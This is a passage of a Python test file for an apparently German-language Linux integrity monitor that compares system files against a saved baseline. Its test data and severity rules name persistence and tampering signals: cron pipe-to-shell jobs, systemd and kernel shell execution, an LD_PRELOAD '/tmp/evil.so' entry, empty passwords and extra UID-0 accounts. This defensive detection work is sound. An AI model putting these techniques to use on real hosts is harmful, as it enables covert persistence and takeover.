        "Gespeicherter Vergleich geladen."
        in reloaded.roots_baseline_guard_info_text.text
    )


def test_roots_baseline_guard_selection_shows_detail_text(tmp_path):
    ssh_file = tmp_path / "sshd_config"
    hosts_file = tmp_path / "hosts"
    passwd_file = tmp_path / "passwd"
    ssh_file.write_text("PermitRootLogin no\n", encoding="utf-8")
    hosts_file.write_text("127.0.0.1 localhost\n", encoding="utf-8")
    passwd_file.write_text("root:x:0:0:root:/root:/bin/bash\n", encoding="utf-8")

    baseline_path = tmp_path / "roots_baseline.json"
    overrides = {
        "SSH Konfiguration": [str(ssh_file)],
        "DNS / Hosts": [str(hosts_file)],
        "Kritische Systemdateien": [str(passwd_file)],
    }
    app = DummyApp(
        baseline_path,
        overrides,
        selected_labels=set(
            roots_baseline_guard_controller.ROOTS_GUARD_SUPPORTED_AREAS
        ),
    )
    roots_baseline_guard_controller.create_roots_baseline_guard_baseline(app)
    ssh_file.write_text("PermitRootLogin yes\n", encoding="utf-8")
    roots_baseline_guard_controller.check_roots_baseline_guard_baseline(app)

    app.roots_baseline_guard_results_table.selected = (0,)
    roots_baseline_guard_controller.on_roots_baseline_guard_result_select(app)

    assert "Pfad:" in app.roots_baseline_guard_info_text.text
    assert "Bereich:" in app.roots_baseline_guard_info_text.text


def test_roots_baseline_guard_result_detail_can_show_signal_lines():
    row = roots_baseline_guard_controller._make_result_row(
        area="SSH Konfiguration",
        path="/etc/ssh/sshd_config",
        change="Unsichere SSH-Option aktiviert",
        risk="Warnung",
        timestamp="2026-05-21 10:00:00",
        status="Prüfen",
        detail_extra="Signale:\n+ SSH erlaubt Root-Login per Passwort/ja",
    )

    assert "Signale:" in row["detail"]
    assert "SSH erlaubt Root-Login" in row["detail"]
    assert row["display"][1].startswith("[SSH] ")


def test_roots_baseline_guard_table_change_labels_show_signal_markers():
    assert (
        roots_baseline_guard_controller._table_change_label(
            "/etc/ssh/sshd_config",
            "Unsichere SSH-Option aktiviert",
            "Signale:\n+ SSH erlaubt Root-Login per Passwort/ja",
        )
        == "[SSH] Unsichere SSH-Option aktiviert"
    )
    assert (
        roots_baseline_guard_controller._table_change_label(
            "/etc/sudoers",
            "Sudo-Regeln sicherheitsrelevant geändert",
            "Signale:\n+ sudoers erlaubt NOPASSWD",
        )
        == "[sudoers] Sudo-Regeln sicherheitsrelevant geändert"
    )
    assert (
        roots_baseline_guard_controller._table_change_label(
            "/etc/passwd",
            "UID-0-/Benutzerstruktur geändert",
            "Signale:\n+ Zusaetzliches UID-0-Konto erkannt: admin",
        )
        == "[UID0] UID-0-/Benutzerstruktur geändert"
    )


def test_roots_baseline_guard_results_table_applies_visual_tags(tmp_path):
    ssh_file = tmp_path / "sshd_config"
    hosts_file = tmp_path / "hosts"
    passwd_file = tmp_path / "passwd"
    ssh_file.write_text("PermitRootLogin no\n", encoding="utf-8")
    hosts_file.write_text("127.0.0.1 localhost\n", encoding="utf-8")
    passwd_file.write_text("root:x:0:0:root:/root:/bin/bash\n", encoding="utf-8")

    baseline_path = tmp_path / "roots_baseline.json"
    overrides = {
        "SSH Konfiguration": [str(ssh_file)],
        "DNS / Hosts": [str(hosts_file)],
        "Kritische Systemdateien": [str(passwd_file)],
    }
    app = DummyApp(
        baseline_path,
        overrides,
        selected_labels=set(
            roots_baseline_guard_controller.ROOTS_GUARD_SUPPORTED_AREAS
        ),
    )
    roots_baseline_guard_controller.create_roots_baseline_guard_baseline(app)
    ssh_file.write_text("PermitRootLogin yes\n", encoding="utf-8")
    roots_baseline_guard_controller.check_roots_baseline_guard_baseline(app)

    assert "roots_critical" in app.roots_baseline_guard_results_table.tags
    assert (
        app.roots_baseline_guard_results_table.tags["roots_hint"]["foreground"]
        == "#5aa07a"
    )
    assert app.roots_baseline_guard_results_table.row_tags[0] == ("roots_warning",)
    assert (
        app.roots_baseline_guard_results_table.tags["roots_warning"]["foreground"]
        == "#c58a00"
    )


def test_roots_baseline_guard_severity_rules_for_systemd_and_authorized_keys():
    assert (
        roots_baseline_guard_controller._signal_change_kind(
            "/etc/systemd/system/demo.service",
            {"systemd:shell_exec"},
            set(),
        )
        == "critical"
    )
    assert (
        roots_baseline_guard_controller._signal_change_kind(
            "/etc/systemd/system/demo.service",
            {"systemd:enabled_boot"},
            set(),
        )
        == "hint"
    )
    assert (
        roots_baseline_guard_controller._signal_change_kind(
            "/etc/cron.d/demo",
            {"cron:pipe_to_shell"},
            set(),
        )
        == "critical"
    )
    assert (
        roots_baseline_guard_controller._signal_change_kind(
            "/etc/cron.d/demo",
            {"cron:at_reboot"},
            set(),
        )
        == "hint"
    )
    assert (
        roots_baseline_guard_controller._signal_change_kind(
            "/etc/modprobe.d/evil.conf",
            {"kernel:shell_exec"},
            set(),
        )
        == "critical"
    )
    assert (
        roots_baseline_guard_controller._signal_change_kind(
            "/etc/modules-load.d/demo.conf",
            {"kernel:module_load:usb-storage"},
            set(),
        )
        == "warning"
    )
    assert (
        roots_baseline_guard_controller._signal_change_kind(
            "/etc/default/grub",
            {"boot:init_shell"},
            set(),
        )
        == "critical"
    )
    assert (
        roots_baseline_guard_controller._signal_change_kind(
            "/etc/default/grub",
            {"boot:selinux_permissive"},
            set(),
        )
        == "warning"
    )
    assert (
        roots_baseline_guard_controller._signal_change_kind(
            "/etc/tmpfiles.d/demo.conf",
            {"tmpfiles:sensitive_target"},
            set(),
        )
        == "critical"
    )
    assert (
        roots_baseline_guard_controller._signal_change_kind(
            "/etc/tmpfiles.d/demo.conf",
            {"tmpfiles:symlink"},
            set(),
        )
        == "warning"
    )
    assert (
        roots_baseline_guard_controller._severity_for_area(
            "SSH Schlüssel / authorized_keys",
            "warning",
            path="/root/.ssh/authorized_keys",
            change="Inhalt geändert",
        )
        == "Kritisch"
    )


def test_roots_baseline_guard_placeholder_row_uses_ok_tag(tmp_path):
    baseline_path = tmp_path / "roots_baseline.json"
    app = DummyApp(baseline_path, overrides={}, selected_labels=set())

    roots_baseline_guard_controller._refresh_results_table(app, [])

    assert (
        app.roots_baseline_guard_results_table.rows[0][0]
        == "Noch keine Änderungen erkannt."
    )
    assert app.roots_baseline_guard_results_table.row_tags[0] == ("roots_ok",)
    assert (
        app.roots_baseline_guard_results_table.tags["roots_ok"]["foreground"]
        == "#5f6770"
    )


def test_roots_baseline_guard_result_rows_map_warning_and_hint_tags():
    warning_row = roots_baseline_guard_controller._make_result_row(
        area="DNS / Hosts",
        path="/etc/hosts",
        change="Dateirechte geändert",
        risk="Warnung",
        timestamp="2026-05-19 12:00:00",
        status="Prüfen",
    )
    hint_row = roots_baseline_guard_controller._make_result_row(
        area="DNS / Hosts",
        path="/etc/hosts",
        change="Zeitstempel geändert",
        risk="Hinweis",
        timestamp="2026-05-19 12:00:01",
        status="Beobachten",
    )
    neutral_row = roots_baseline_guard_controller._make_result_row(
        area="DNS / Hosts",
        path="/etc/hosts",
        change="Unbekannt",
        risk="-",
        timestamp="2026-05-19 12:00:02",
        status="Info",
    )

    assert warning_row["tag"] == "roots_warning"
    assert hint_row["tag"] == "roots_hint"
    assert neutral_row["tag"] == "roots_neutral"


def test_roots_baseline_guard_results_table_sorts_by_risk_and_category(tmp_path):
    baseline_path = tmp_path / "roots_baseline.json"
    app = DummyApp(baseline_path, overrides={}, selected_labels=set())
    rows = [
        roots_baseline_guard_controller._make_result_row(
            area="SSH Konfiguration",
            path="/etc/ssh/sshd_config",
            change="SSH-Option aktiviert: PermitRootLogin yes",
            risk="Warnung",
            timestamp="2026-05-21 10:00:03",
            status="Prüfen",
            detail_extra="Signale:\n+ SSH erlaubt Root-Login per Passwort/ja",
        ),
        roots_baseline_guard_controller._make_result_row(
            area="Kritische Systemdateien",
            path="/etc/ld.so.preload",
            change="LD_PRELOAD-Eintrag erkannt: /tmp/evil.so",
            risk="Kritisch",
            timestamp="2026-05-21 10:00:01",
            status="Prüfen",
            detail_extra="Signale:\n+ LD_PRELOAD-Eintrag erkannt: /tmp/evil.so",
        ),
        roots_baseline_guard_controller._make_result_row(
            area="Kritische Systemdateien",
            path="/etc/shadow",
            change="Passwortstatus auffällig: leeres Passwort demo",
            risk="Kritisch",
            timestamp="2026-05-21 10:00:02",
            status="Prüfen",
            detail_extra="Signale:\n+ Leeres Passwort erkannt: demo",
        ),
        roots_baseline_guard_controller._make_result_row(
            area="Autostart / systemd / cron",
            path="/etc/cron.d/demo",
            change="Cron-Fund aktiviert: Netzwerk-Download",
            risk="Hinweis",
            timestamp="2026-05-21 10:00:04",
            status="Beobachten",
            detail_extra="Signale:\n+ Cron startet Netzwerk-Download",
        ),
    ]

    roots_baseline_guard_controller._refresh_results_table(app, rows)

    assert [entry["path"] for entry in app.roots_baseline_guard_result_meta] == [
        "/etc/ld.so.preload",
        "/etc/shadow",
        "/etc/ssh/sshd_config",
        "/etc/cron.d/demo",
    ]
    assert app.roots_baseline_guard_results_table.rows[0][0] == "/etc/ld.so.preload"
    assert app.roots_baseline_guard_results_table.rows[1][0] == "/etc/shadow"
    assert app.roots_signal_summary_var.get() == "Funde: LD_PRELOAD, shadow, SSH, cron"


def test_roots_baseline_guard_chad_analysis_uses_current_results(tmp_path):
    ssh_file = tmp_path / "sshd_config"
    hosts_file = tmp_path / "hosts"
    passwd_file = tmp_path / "passwd"
    ssh_file.write_text("PermitRootLogin no\n", encoding="utf-8")
    hosts_file.write_text("127.0.0.1 localhost\n", encoding="utf-8")
    passwd_file.write_text("root:x:0:0:root:/root:/bin/bash\n", encoding="utf-8")

    baseline_path = tmp_path / "roots_baseline.json"
    overrides = {
        "SSH Konfiguration": [str(ssh_file)],
        "DNS / Hosts": [str(hosts_file)],
        "Kritische Systemdateien": [str(passwd_file)],
    }
    app = DummyApp(
        baseline_path,
        overrides,
        selected_labels=set(
            roots_baseline_guard_controller.ROOTS_GUARD_SUPPORTED_AREAS
        ),
    )
    roots_baseline_guard_controller.create_roots_baseline_guard_baseline(app)
    ssh_file.write_text("PermitRootLogin yes\n", encoding="utf-8")
    roots_baseline_guard_controller.check_roots_baseline_guard_baseline(app)

    assert (
        roots_baseline_guard_controller.analyze_roots_baseline_guard_with_chad(app)
        is True
    )
    assert app.prepared_chad is not None
    assert app.prepared_chad["title"] == "Roots Baseline Guard Analyse"
    assert "Roots Baseline Guard" in app.prepared_chad["raw_text"]
    assert "Pfad:" in app.prepared_chad["raw_text"]
    assert "Sicherheitskontext:" in app.prepared_chad["raw_text"]
    assert "Details:" in app.prepared_chad["raw_text"]
    assert "SSH erlaubt Root-Login" in app.prepared_chad["raw_text"]
    assert "Direkter Root-Login ueber SSH" in app.prepared_chad["raw_text"]


def test_roots_baseline_guard_explain_selected_change_requires_selection(tmp_path):
    ssh_file = tmp_path / "sshd_config"
    hosts_file = tmp_path / "hosts"
    passwd_file = tmp_path / "passwd"
    ssh_file.write_text("PermitRootLogin no\n", encoding="utf-8")
    hosts_file.write_text("127.0.0.1 localhost\n", encoding="utf-8")
    passwd_file.write_text("root:x:0:0:root:/root:/bin/bash\n", encoding="utf-8")

    baseline_path = tmp_path / "roots_baseline.json"
    overrides = {
        "SSH Konfiguration": [str(ssh_file)],
        "DNS / Hosts": [str(hosts_file)],
        "Kritische Systemdateien": [str(passwd_file)],
    }
    app = DummyApp(
        baseline_path,
        overrides,
        selected_labels=set(
            roots_baseline_guard_controller.ROOTS_GUARD_SUPPORTED_AREAS
        ),
    )
    roots_baseline_guard_controller.create_roots_baseline_guard_baseline(app)
    ssh_file.write_text("PermitRootLogin yes\n", encoding="utf-8")
    roots_baseline_guard_controller.check_roots_baseline_guard_baseline(app)

    assert (
        roots_baseline_guard_controller.explain_selected_roots_baseline_guard_change(
            app
        )
        is False
    )
    app.roots_baseline_guard_results_table.selected = (0,)
    assert (
        roots_baseline_guard_controller.explain_selected_roots_baseline_guard_change(
            app
        )
        is True
    )
    assert app.prepared_chad is not None
    assert app.prepared_chad["title"] == "Roots Baseline Guard Änderung erklären"
    assert "Details:" in app.prepared_chad["raw_text"]


def test_roots_baseline_guard_add_selected_change_to_whitelist(tmp_path):
    ssh_file = tmp_path / "sshd_config"
    hosts_file = tmp_path / "hosts"
    passwd_file = tmp_path / "passwd"
    ssh_file.write_text("PermitRootLogin no\n", encoding="utf-8")
    hosts_file.write_text("127.0.0.1 localhost\n", encoding="utf-8")
    passwd_file.write_text("root:x:0:0:root:/root:/bin/bash\n", encoding="utf-8")

    baseline_path = tmp_path / "roots_baseline.json"
    overrides = {
        "SSH Konfiguration": [str(ssh_file)],
        "DNS / Hosts": [str(hosts_file)],
        "Kritische Systemdateien": [str(passwd_file)],
    }
    app = DummyApp(
        baseline_path,
        overrides,
        selected_labels=set(
            roots_baseline_guard_controller.ROOTS_GUARD_SUPPORTED_AREAS
        ),
    )
    roots_baseline_guard_controller.create_roots_baseline_guard_baseline(app)
    ssh_file.write_text("PermitRootLogin yes\n", encoding="utf-8")
    roots_baseline_guard_controller.check_roots_baseline_guard_baseline(app)

    app.roots_baseline_guard_results_table.selected = (0,)
    assert (
        roots_baseline_guard_controller.add_selected_roots_baseline_guard_change_to_whitelist(
            app
        )
        is True
    )
    data = json.loads(
        open(app.roots_baseline_guard_whitelist_path, encoding="utf-8").read()
    )
    assert len(data["entries"]) == 1
    assert data["entries"][0]["category"] == "SSH"
    assert "manuelle Roots-Whitelist" in app.roots_baseline_guard_info_text.text


def test_roots_baseline_guard_show_whitelist(tmp_path):
    baseline_path = tmp_path / "roots_baseline.json"
    app = DummyApp(baseline_path, overrides={}, selected_labels=set())
    payload = {
        "version": 1,
        "entries": [
            {
                "area": "SSH Konfiguration",
                "category": "SSH",
                "path": "/etc/ssh/sshd_config",
                "change": "Inhalt geändert",
                "risk": "Kritisch",
                "added_at": "2026-05-19 12:00:00",
            },
            {
                "area": "Autostart / systemd / cron",
                "category": "cron",
                "path": "/etc/cron.d/demo",
                "change": "Cron-Fund aktiviert: Netzwerk-Download",
                "risk": "Warnung",
                "added_at": "2026-05-19 12:05:00",
            },
        ],
    }
    with open(app.roots_baseline_guard_whitelist_path, "w", encoding="utf-8") as handle:
        json.dump(payload, handle)

    assert (
        roots_baseline_guard_controller.show_roots_baseline_guard_whitelist(app) is True
    )
    assert "=== Roots Whitelist ===" in app.roots_baseline_guard_info_text.text
    assert len(app.roots_baseline_guard_whitelist_list.items) == 2
    assert "--- SSH ---" in app.roots_baseline_guard_info_text.text
    assert "--- cron ---" in app.roots_baseline_guard_info_text.text
    assert app.roots_baseline_guard_info_text.text.index(
        "--- SSH ---"
    ) < app.roots_baseline_guard_info_text.text.index("--- cron ---")
    assert "sshd_config" in app.roots_baseline_guard_info_text.text


def test_roots_baseline_guard_refresh_whitelist_list_updates_meta_and_items():
    app = DummyApp(
        baseline_path=Path("/tmp/roots_baseline.json"),
        overrides={},
        selected_labels=set(),
    )
    entries = [
        {
            "category": "SSH",
            "path": "/etc/ssh/sshd_config",
            "change": "Inhalt geändert",
        },
        {
            "category": "cron",
            "path": "/etc/cron.d/demo",
            "change": "Cron-Fund aktiviert",
        },
    ]

    roots_baseline_guard_controller._refresh_whitelist_list(app, entries)

    assert app.roots_baseline_guard_whitelist_meta == entries
    assert app.roots_baseline_guard_whitelist_list.items == [
        "[SSH] /etc/ssh/sshd_config :: Inhalt geändert",
        "[cron] /etc/cron.d/demo :: Cron-Fund aktiviert",
    ]


def test_roots_baseline_guard_whitelist_selection_shows_detail(tmp_path):
    baseline_path = tmp_path / "roots_baseline.json"
    app = DummyApp(baseline_path, overrides={}, selected_labels=set())
    payload = {
        "version": 1,
        "entries": [
            {
                "area": "SSH Konfiguration",
                "category": "SSH",
                "path": "/etc/ssh/sshd_config",
                "change": "Inhalt geändert",
                "risk": "Kritisch",
                "added_at": "2026-05-19 12:00:00",
            }
        ],
    }
    with open(app.roots_baseline_guard_whitelist_path, "w", encoding="utf-8") as handle:
        json.dump(payload, handle)

    roots_baseline_guard_controller.show_roots_baseline_guard_whitelist(app)
    app.roots_baseline_guard_whitelist_list.selection_set(0)
    roots_baseline_guard_controller.on_roots_baseline_guard_whitelist_select(app)
    assert "=== Roots Whitelist Eintrag ===" in app.roots_baseline_guard_info_text.text
    assert "Kategorie: SSH" in app.roots_baseline_guard_info_text.text


def test_roots_baseline_guard_open_selected_whitelist_entry_selects_matching_result(
    tmp_path,
):
    ssh_file = tmp_path / "sshd_config"
    hosts_file = tmp_path / "hosts"
    passwd_file = tmp_path / "passwd"
    ssh_file.write_text("PermitRootLogin no\n", encoding="utf-8")
    hosts_file.write_text("127.0.0.1 localhost\n", encoding="utf-8")
    passwd_file.write_text("root:x:0:0:root:/root:/bin/bash\n", encoding="utf-8")

    baseline_path = tmp_path / "roots_baseline.json"
    overrides = {
        "SSH Konfiguration": [str(ssh_file)],
        "DNS / Hosts": [str(hosts_file)],
        "Kritische Systemdateien": [str(passwd_file)],
    }
    app = DummyApp(
        baseline_path,
        overrides,
        selected_labels=set(
            roots_baseline_guard_controller.ROOTS_GUARD_SUPPORTED_AREAS
        ),
    )
    roots_baseline_guard_controller.create_roots_baseline_guard_baseline(app)
    ssh_file.write_text("PermitRootLogin yes\n", encoding="utf-8")
    roots_baseline_guard_controller.check_roots_baseline_guard_baseline(app)
    app.roots_baseline_guard_results_table.selected = (0,)
    roots_baseline_guard_controller.add_selected_roots_baseline_guard_change_to_whitelist(
        app
    )
    roots_baseline_guard_controller.show_roots_baseline_guard_whitelist(app)

    app.roots_baseline_guard_results_table.selected = ()
    app.roots_baseline_guard_whitelist_list.selection_set(0)
    assert (
        roots_baseline_guard_controller.open_selected_roots_baseline_guard_whitelist_entry(
            app
        )
        is True
    )
    assert app.roots_baseline_guard_results_table.selected == (0,)
    assert app.roots_baseline_guard_results_table.focused == 0
    assert "Bereich: SSH Konfiguration" in app.roots_baseline_guard_info_text.text


def test_roots_baseline_guard_remove_selected_change_from_whitelist(tmp_path):
    ssh_file = tmp_path / "sshd_config"
    hosts_file = tmp_path / "hosts"
    passwd_file = tmp_path / "passwd"
    ssh_file.write_text("PermitRootLogin no\n", encoding="utf-8")
    hosts_file.write_text("127.0.0.1 localhost\n", encoding="utf-8")
    passwd_file.write_text("root:x:0:0:root:/root:/bin/bash\n", encoding="utf-8")

    baseline_path = tmp_path / "roots_baseline.json"
    overrides = {
        "SSH Konfiguration": [str(ssh_file)],
        "DNS / Hosts": [str(hosts_file)],
        "Kritische Systemdateien": [str(passwd_file)],
    }
    app = DummyApp(
        baseline_path,
        overrides,
        selected_labels=set(
            roots_baseline_guard_controller.ROOTS_GUARD_SUPPORTED_AREAS
        ),
    )
    roots_baseline_guard_controller.create_roots_baseline_guard_baseline(app)
    ssh_file.write_text("PermitRootLogin yes\n", encoding="utf-8")
    roots_baseline_guard_controller.check_roots_baseline_guard_baseline(app)
    app.roots_baseline_guard_results_table.selected = (0,)
    roots_baseline_guard_controller.add_selected_roots_baseline_guard_change_to_whitelist(
        app
    )

    assert (
        roots_baseline_guard_controller.remove_selected_roots_baseline_guard_change_from_whitelist(
            app
        )
        is True
    )
    data = json.loads(
        open(app.roots_baseline_guard_whitelist_path, encoding="utf-8").read()
    )
    assert data["entries"] == []
    assert (
        "aus der manuellen Roots-Whitelist entfernt"
        in app.roots_baseline_guard_info_text.text
    )


def test_roots_baseline_guard_remove_selected_whitelist_entry_from_shown_list(tmp_path):
    baseline_path = tmp_path / "roots_baseline.json"
    app = DummyApp(baseline_path, overrides={}, selected_labels=set())
    payload = {
        "version": 1,
        "entries": [
            {
                "area": "SSH Konfiguration",
                "category": "SSH",
                "path": "/etc/ssh/sshd_config",
                "change": "Inhalt geändert",
                "risk": "Warnung",
                "added_at": "2026-05-19 12:00:00",
            },
            {
                "area": "Autostart / systemd / cron",
                "category": "cron",
                "path": "/etc/cron.d/demo",
                "change": "Cron-Fund aktiviert: Netzwerk-Download",
                "risk": "Warnung",
                "added_at": "2026-05-19 12:05:00",
            },
        ],
    }
    with open(app.roots_baseline_guard_whitelist_path, "w", encoding="utf-8") as handle:
        json.dump(payload, handle)

    roots_baseline_guard_controller.show_roots_baseline_guard_whitelist(app)
    app.roots_baseline_guard_whitelist_list.selection_set(1)
    assert (
        roots_baseline_guard_controller.remove_selected_roots_baseline_guard_change_from_whitelist(
            app
        )
        is True
    )
    data = json.loads(
        open(app.roots_baseline_guard_whitelist_path, encoding="utf-8").read()
    )
    assert len(data["entries"]) == 1
    assert data["entries"][0]["category"] == "SSH"
    assert len(app.roots_baseline_guard_whitelist_list.items) == 1


def test_roots_baseline_guard_check_uses_whitelist_when_enabled(tmp_path):
    ssh_file = tmp_path / "sshd_config"
    hosts_file = tmp_path / "hosts"
    passwd_file = tmp_path / "passwd"
    ssh_file.write_text("PermitRootLogin no\n", encoding="utf-8")
    hosts_file.write_text("127.0.0.1 localhost\n", encoding="utf-8")
    passwd_file.write_text("root:x:0:0:root:/root:/bin/bash\n", encoding="utf-8")

    baseline_path = tmp_path / "roots_baseline.json"
    overrides = {
        "SSH Konfiguration": [str(ssh_file)],
        "DNS / Hosts": [str(hosts_file)],
        "Kritische Systemdateien": [str(passwd_file)],
    }
    app = DummyApp(
        baseline_path,
        overrides,
        selected_labels=set(
            roots_baseline_guard_controller.ROOTS_GUARD_SUPPORTED_AREAS
        ),
    )
    roots_baseline_guard_controller.create_roots_baseline_guard_baseline(app)
    ssh_file.write_text("PermitRootLogin yes\n", encoding="utf-8")
    roots_baseline_guard_controller.check_roots_baseline_guard_baseline(app)
    app.roots_baseline_guard_results_table.selected = (0,)
    roots_baseline_guard_controller.add_selected_roots_baseline_guard_change_to_whitelist(
        app
    )

    app.roots_baseline_guard_trust_vars["Benutzer-Whitelist berücksichtigen"].set(True)
    assert (
        roots_baseline_guard_controller.check_roots_baseline_guard_baseline(app) is True
    )
    assert (
        app.roots_integrity_counts_var.get()
        == "Kritisch: 0 | Warnungen: 0 | Hinweise: 0"
    )
    assert (
        app.roots_baseline_guard_results_table.rows[0][0]
        == "Noch keine Änderungen erkannt."
    )
    assert "Whitelist-Eintrag/Einträge" in app.roots_baseline_guard_info_text.text


def test_roots_baseline_guard_check_does_not_use_whitelist_when_disabled(tmp_path):
    ssh_file = tmp_path / "sshd_config"
    hosts_file = tmp_path / "hosts"
    passwd_file = tmp_path / "passwd"
    ssh_file.write_text("PermitRootLogin no\n", encoding="utf-8")
    hosts_file.write_text("127.0.0.1 localhost\n", encoding="utf-8")
    passwd_file.write_text("root:x:0:0:root:/root:/bin/bash\n", encoding="utf-8")

    baseline_path = tmp_path / "roots_baseline.json"
    overrides = {
        "SSH Konfiguration": [str(ssh_file)],
        "DNS / Hosts": [str(hosts_file)],
        "Kritische Systemdateien": [str(passwd_file)],
    }
    app = DummyApp(
        baseline_path,
        overrides,
        selected_labels=set(
            roots_baseline_guard_controller.ROOTS_GUARD_SUPPORTED_AREAS
        ),
    )
    roots_baseline_guard_controller.create_roots_baseline_guard_baseline(app)
    ssh_file.write_text("PermitRootLogin yes\n", encoding="utf-8")
    roots_baseline_guard_controller.check_roots_baseline_guard_baseline(app)
    app.roots_baseline_guard_results_table.selected = (0,)
    roots_baseline_guard_controller.add_selected_roots_baseline_guard_change_to_whitelist(
        app
    )

    app.roots_baseline_guard_trust_vars["Benutzer-Whitelist berücksichtigen"].set(False)
    assert (
        roots_baseline_guard_controller.check_roots_baseline_guard_baseline(app) is True
    )
    assert (
        app.roots_integrity_counts_var.get()
        == "Kritisch: 0 | Warnungen: 1 | Hinweise: 0"
    )
    assert "sshd_config" in str(app.roots_baseline_guard_results_table.rows[0][0])


def test_roots_baseline_guard_ignores_known_system_changes_when_enabled(tmp_path):
    ssh_file = tmp_path / "sshd_config"
    resolv_file = tmp_path / "resolv.conf"
    passwd_file = tmp_path / "passwd"
    ssh_file.write_text("PermitRootLogin no\n", encoding="utf-8")
    resolv_file.write_text("nameserver 1.1.1.1\n", encoding="utf-8")
    passwd_file.write_text("root:x:0:0:root:/root:/bin/bash\n", encoding="utf-8")

    baseline_path = tmp_path / "roots_baseline.json"
    overrides = {
        "SSH Konfiguration": [str(ssh_file)],
        "DNS / Hosts": [str(resolv_file)],
        "Kritische Systemdateien": [str(passwd_file)],
    }
    app = DummyApp(
        baseline_path,
        overrides,
        selected_labels=set(
            roots_baseline_guard_controller.ROOTS_GUARD_SUPPORTED_AREAS
        ),
    )
    roots_baseline_guard_controller.create_roots_baseline_guard_baseline(app)
    resolv_file.write_text("nameserver 8.8.8.8\n", encoding="utf-8")

    app.roots_baseline_guard_trust_vars["Bekannte Systemänderungen ignorieren"].set(
        True
    )
    assert (
        roots_baseline_guard_controller.check_roots_baseline_guard_baseline(app) is True
    )
    assert (
        app.roots_integrity_counts_var.get()
        == "Kritisch: 0 | Warnungen: 0 | Hinweise: 0"
    )
    assert (
        app.roots_baseline_guard_results_table.rows[0][0]
        == "Noch keine Änderungen erkannt."
    )
    assert "bekannte Systemänderung" in app.roots_baseline_guard_info_text.text


def test_roots_baseline_guard_lowers_package_style_ssh_changes(tmp_path):
    ssh_file = tmp_path / "sshd_config"
    hosts_file = tmp_path / "hosts"
    passwd_file = tmp_path / "passwd"
    ssh_file.write_text("PermitRootLogin no\n", encoding="utf-8")
    hosts_file.write_text("127.0.0.1 localhost\n", encoding="utf-8")
    passwd_file.write_text("root:x:0:0:root:/root:/bin/bash\n", encoding="utf-8")

    baseline_path = tmp_path / "roots_baseline.json"
    overrides = {
        "SSH Konfiguration": [str(ssh_file)],
        "DNS / Hosts": [str(hosts_file)],
        "Kritische Systemdateien": [str(passwd_file)],
    }
    app = DummyApp(
        baseline_path,
        overrides,
        selected_labels=set(
            roots_baseline_guard_controller.ROOTS_GUARD_SUPPORTED_AREAS
        ),
    )
    roots_baseline_guard_controller.create_roots_baseline_guard_baseline(app)

    ssh_file.write_text("PermitRootLogin no\n# package touch\n", encoding="utf-8")
    app.roots_baseline_guard_trust_vars["Paketupdates niedriger einstufen"].set(True)
    assert (
        roots_baseline_guard_controller.check_roots_baseline_guard_baseline(app) is True
    )
    assert (
        app.roots_integrity_counts_var.get()
        == "Kritisch: 0 | Warnungen: 0 | Hinweise: 1"
    )
    assert "Paketupdate-/Dienst-Aenderung" in app.roots_baseline_guard_info_text.text
    assert "Trust-Hinweis" in app.roots_baseline_guard_result_meta[0]["detail"]


def test_roots_baseline_guard_lowers_package_style_sysctl_changes(tmp_path):
    ssh_file = tmp_path / "sshd_config"
    hosts_file = tmp_path / "hosts"
    sysctl_dir = tmp_path / "sysctl.d"
    sysctl_dir.mkdir()
    sysctl_file = sysctl_dir / "99-demo.conf"
    ssh_file.write_text("PermitRootLogin no\n", encoding="utf-8")
    hosts_file.write_text("127.0.0.1 localhost\n", encoding="utf-8")
    sysctl_file.write_text("# baseline\n", encoding="utf-8")

    baseline_path = tmp_path / "roots_baseline.json"
    overrides = {
        "SSH Konfiguration": [str(ssh_file)],
        "DNS / Hosts": [str(hosts_file)],
        "Kritische Systemdateien": [str(sysctl_file)],
    }
    app = DummyApp(
        baseline_path,
        overrides,
        selected_labels=set(
            roots_baseline_guard_controller.ROOTS_GUARD_SUPPORTED_AREAS
        ),
    )
    roots_baseline_guard_controller.create_roots_baseline_guard_baseline(app)

    sysctl_file.write_text("# baseline\n# maintainer refresh\n", encoding="utf-8")
    app.roots_baseline_guard_trust_vars["Paketupdates niedriger einstufen"].set(True)
    assert (
        roots_baseline_guard_controller.check_roots_baseline_guard_baseline(app) is True
    )
    assert (
        app.roots_integrity_counts_var.get()
        == "Kritisch: 0 | Warnungen: 1 | Hinweise: 0"
    )
    assert "Paketupdate-/Dienst-Aenderung" in app.roots_baseline_guard_info_text.text
    assert "Trust-Hinweis" in app.roots_baseline_guard_result_meta[0]["detail"]


def test_roots_baseline_guard_ignores_known_shell_timestamp_changes(tmp_path):
    ssh_file = tmp_path / "sshd_config"
    hosts_file = tmp_path / "hosts"
    profile_file = tmp_path / "profile"
    ssh_file.write_text("PermitRootLogin no\n", encoding="utf-8")
    hosts_file.write_text("127.0.0.1 localhost\n", encoding="utf-8")
    profile_file.write_text("PATH=/usr/bin\n", encoding="utf-8")

    baseline_path = tmp_path / "roots_baseline.json"
    overrides = {
        "SSH Konfiguration": [str(ssh_file)],
        "DNS / Hosts": [str(hosts_file)],
        "Kritische Systemdateien": [str(profile_file)],
    }
    app = DummyApp(
        baseline_path,
        overrides,
        selected_labels=set(
            roots_baseline_guard_controller.ROOTS_GUARD_SUPPORTED_AREAS
        ),
    )
    roots_baseline_guard_controller.create_roots_baseline_guard_baseline(app)

    import os

    os.utime(profile_file, None)
    app.roots_baseline_guard_trust_vars["Bekannte Systemänderungen ignorieren"].set(
        True
    )
    assert (
        roots_baseline_guard_controller.check_roots_baseline_guard_baseline(app) is True
    )
    assert (
        app.roots_integrity_counts_var.get()
        == "Kritisch: 0 | Warnungen: 0 | Hinweise: 0"
    )
    assert (
        app.roots_baseline_guard_results_table.rows[0][0]
        == "Noch keine Änderungen erkannt."
    )
    assert "bekannte Systemänderung" in app.roots_baseline_guard_info_text.text


def test_roots_baseline_guard_ignores_known_grub_timestamp_changes(tmp_path):
    ssh_file = tmp_path / "sshd_config"
    hosts_file = tmp_path / "hosts"
    boot_dir = tmp_path / "boot" / "grub"
    boot_dir.mkdir(parents=True)
    grub_file = boot_dir / "grub.cfg"
    ssh_file.write_text("PermitRootLogin no\n", encoding="utf-8")
    hosts_file.write_text("127.0.0.1 localhost\n", encoding="utf-8")
    grub_file.write_text("set timeout=5\n", encoding="utf-8")

    baseline_path = tmp_path / "roots_baseline.json"
    overrides = {
        "SSH Konfiguration": [str(ssh_file)],
        "DNS / Hosts": [str(hosts_file)],
        "Kritische Systemdateien": [str(grub_file)],
    }
    app = DummyApp(
        baseline_path,
        overrides,
        selected_labels=set(
